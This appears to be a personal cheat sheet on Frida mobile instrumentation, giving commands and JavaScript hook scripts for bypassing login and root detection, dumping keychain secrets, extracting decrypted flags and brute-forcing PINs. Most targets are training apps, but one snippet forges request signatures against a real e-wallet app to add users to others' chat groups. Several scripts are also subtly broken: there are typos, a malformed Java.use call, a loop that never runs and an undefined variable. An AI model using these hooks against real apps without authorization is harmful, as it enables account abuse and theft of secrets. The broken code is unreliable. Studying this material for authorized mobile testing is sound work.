# Frida

Frida Javascript API documentation: <https://frida.re/docs/javascript-api/#java>  
Good talk with simple examples: <https://www.youtube.com/watch?v=iMNs8YAy6pk>  

Frida-server link [here](https://github.com/frida/frida/releases)  
Decompress with `unxz`  

## Frida-ps

```bash
# List processes
frida-ps -U

# List running apps
frida-ps -Ua

# List installed apps
frida-ps -Uai

# Connect frida to specific device
frida-ps -D <device-id>
```

## Example login bypass with python

Using [Sieve APK](https://github.com/as0ler/Android-Examples/blob/master/sieve.apk)  

```python3
import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(function () {
    //Obtain referrence of the Activity currently running
    var MainActivity = Java.use('com.mwr.example.sieve.MainLoginActivity');
	//Obtain reference of the function whcih needs to be called
    MainActivity.checkKeyResult.implementation = function (b) {
        send('checkKeyResult');
	//Calling the function and passing the boolean parameter as true
        this.checkKeyResult(true);
		
        console.log('Done:');
    };
});
"""

process = frida.get_usb_device().attach('com.mwr.example.sieve')
script = process.create_script(jscode)
script.on('message', on_message)
script.load()
sys.stdin.read()
```

## Log function and method invocations  

`-m` flag specifies Objective-C methods  
Use wildcards to match on simple patterns  

Example: NSURLRequest -initWithURL:cachePolicy:timeoutInterval:  
`frida-trace -U -m "-[NSURLRequest initWithURL:cache*]" myApp`  

## Modifying handlers:  

Frida's javascript API can be used  
`ObjC.Object()` creates a JavaScript binding to the object specified by an argument  
`ObjC.Object(ards[2]).toString()` can be used to convert hex to ASCII for example  

## Ways to use frida:  

- monitor method I/O at runtime
- analyze app-specific data
- bypass controls
- manipulate app behaviour
- explore an app under the hood

## Tracing functions on Android  

frida can trace single functions or libraries  
`-i` flag will apply a pattern to find functions  
`-I` flag will hook all functions under the specified library  
`frida-trace -U -i open* -I *sqlite* com.google.android.apps.photos`  

## Using a trace to explore  

Example: iOS keychain  
use `-f` to launch the app  
`frida-trace -U -m "*[*eychain* *]" -i SecItemCopyMatching -f [target]`  

## Directly call methods with Frida CLI  

JavaScript REPL (read-Execute-Print-Loop)  
Load "agent" scripts  

Example DVIA:  

```bash
frida -U DVIA   # open the application
bindings = ObjC.classes.PDKeychainBindings.SharedKeychainBindings()
controller = ObjC.classes.PDKeychainBindingsController.SharedKeychainBindingsController()
controller.$ownMethods   # show methods contained in "controller"
bindings.$ownMethods  # show methods contained in "bindings"
controller.values()   # dump values in handle form
controller.values().toString  # dump values as string
controller.stringForKey_("keychainValue").toString()  # confirm stored secret
```

## Automate with Agent scripts  

Once tested, bundle it into an agent  
- self-contained JavaScript file
- injected into the target
- functions you define can be called from the CLI

`frida -l agent.js [target]`  

## Root Detection on Android Startup

Using: <https://github.com/OWASP/owasp-mastg/blob/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk>  
Reference: <https://nibarius.github.io/learning-frida/2020/05/16/uncrackable1>  

Root detection is performed as soon as the application is opened. You cannot hook with frida until the app has started.  
Start the app with frida and suppress the root detection message:  

```javascript
Java.perform(function() {	// invoke API
	// Use the main activitiy in the application and store the result of the method called "a", in "s"
	Java.use("sg.vantagepoint.uncrackable1.MainActivity".a.implementation = function(s) {
		// print that "a" was suppressed and what the original message was
		console.log("Tamper detection suppressed, message was: " + s);
	}
});
```

Then run `frida -U --no-pause -l script.js -f <target package name>`  

### Getting a secret

Continuing from the root detection above, Get values from a function that decodes a string into a byte array  
Add the following code to the above script  

```javascript
 	function bufferToString(buf) {
		// create a byte array from the passed value
    		var buffer = Java.array('byte', buf);
    		var result = "";
		// loop over the byte array, converting each character to a string
    		for(var i = 0; i < buffer.length; ++i){
      			result += (String.fromCharCode(buffer[i] & 0xff));
    		}
		// return the string
    		return result;
  	}
  	
	//  stave the original implementation of sg.vantagepoint.a.a.a
  	Java.use("sg.vantagepoint.a.a").a.implementation = function(ba1, ba2) {
		// convert the value
		const retval = this.a(ba1, ba2);
    		console.log("secret code is: " + bufferToString(retval));
    		return retval;
  	}
```

## Tracing Java methods on Android  

no support yet for matching Java methods in frida-trace  
replace the method implementation  
use the Java API on Android
- Java.perform
- Java.use

Building agent.js  
```javascript
'use strict'

if (Java.available) {
  Java.perform( function() {
    const WebView = Java.use("android.webkit.WebView");
    WebView.loadUrl.overload("java.lang.String").implementation = funtion(url) {
      console.log("\x1b[2m[*] WebView loadUrl -> \x1b[0m\x1b[34;1m" +url + "\1b[0m");
      this.loadUrl.overload("java.lang.String").call(this, url);
    };
  });
}
```

How can we use agents  
- automate tedious tasks
- define new commands for the cli

BlueCrawl collects metadata from a device
- leverages CLI for easy script injection

## Manual Fun When Hooked by Frida

```bash
Process.enumerateModules()
Process.findModuleByName("name.so")
Process.findModuleByName("name.so").enumerateExports()
Process.findModuleByName("name.so").enumerateImports()	// look for juicy things like strncmp
```

## Frida Code Snippets

<https://erev0s.com/blog/frida-code-snippets-for-android/>  

---

```javascript
// https://blog.sambal0x.com/2020/04/30/Hacking-razer-pay-ewallet-app.html
// frida.js - Use this for recalculating signature for adding user to other people's chatgroup

console.log("Starting...")
Java.perform(function () {
    var MD5 = Java.use('com.mol.molwallet.view.MD5')
    MD5.MD5Encode.implementation = function (arg)
    {
        console.log("Hooking class MD5 - method MD5Encode")

       //Extra step - calculate new signature
        var ret_value = this.MD5Encode("groupId=1x9&userIds=95xxx7&token=b6fxxxd3-2xxc-4xxf-bxx7-7fxxxxa6")
        console.log("[+]  signature= " + ret_value)

        //Call method with original arguments so app doesn't crash ..
        var ret_value = this.MD5Encode(arg) //original value
                console.log("original ARG: " + arg)  
        return ret_value;
    }
})
```

Trigger a method:  

```javascript
Java.perform(function() {
        var webint = Java.use("com.hacker101.oauth.WebAppInterface");
        var flag = webint.$new(null).getFlagPath();
        console.log("Flag: " + flag);
        
});
```

Create a loop:  

```javascript
Java.perform(function() {
        var onComplete = Java.use("com.hackerone.mobile.challenge2.MainActivity$1");
        onComplete.onComplete.implementation = function(arg1) {
                console.log("ARG1: " + arg1);

                for (var i = 1; i > 999999; i++) {
                        var currentPin = String(i).padStart(6, '0');
                        var retval = this.onComplete(currentPin);
                        if (success) {
                                console.log("The correct pin is: " + currentPin);
                                return retval;
                        }
                }
                console.log("Done");
        }
});
```

Hook a method and execute normally but save results:  

```javascript
Java.perform(function() {
        var success = false;
        var sb = Java.use("org.libsodium.jni.crypto.SecretBox");
        sb.decrypt.implementation = function(ba1, ba2) {
                var ret = "";
                try {
                        ret = this.decrypt(ba1, ba2);
                        success = true;
                        console.log("Found the flag: " + Java.use('java.lang.String').$new(ret));
                } catch (ex) {
                        success = false;
                        ret = Java.array('byte', []);
                }
                return ret;
        }
});
```
